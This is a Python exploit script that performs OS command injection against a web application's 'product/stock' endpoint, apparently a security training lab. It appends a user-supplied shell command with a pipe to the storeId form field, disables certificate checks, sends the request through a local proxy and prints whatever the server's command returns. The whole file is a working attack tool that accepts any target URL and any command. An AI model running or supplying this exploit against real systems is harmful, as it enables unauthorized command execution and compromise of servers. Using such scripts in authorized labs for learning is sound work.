import urllib3
import sys
import requests

# to disable unwanted warnings about certificates, .. etc.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# configure the proxy settings.
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

# Creating the OS Command injection function.
def run(url, command):
    path = 'product/stock'
    payload = "|" + command
    data = {'productId' : 1, 'storeId': "1" + payload}

    respond = requests.post(url + path, data=data, verify=False, proxies=proxies)
    
    # Checks the length of the respond 
    # that is more than the 3 which represents the actual stock value.
    if len(respond.text) > 3:
        print("(+) OS Command Injection Done Successfully!")
        print("(+) The output of the command:\n" + respond.text)
    else:
        print("(-) OS Command Injection Failed.")

def main():

    # Checks if the script run on the command-line correctly.
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <command>" % sys.argv[0])
        print("(+) Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)
    
    # if the input is valid:
    url = sys.argv[1]
    command = sys.argv[2]
    print("(+) Exploiting OS command injection ...")
    run(url, command)

if __name__ == "__main__":
    main()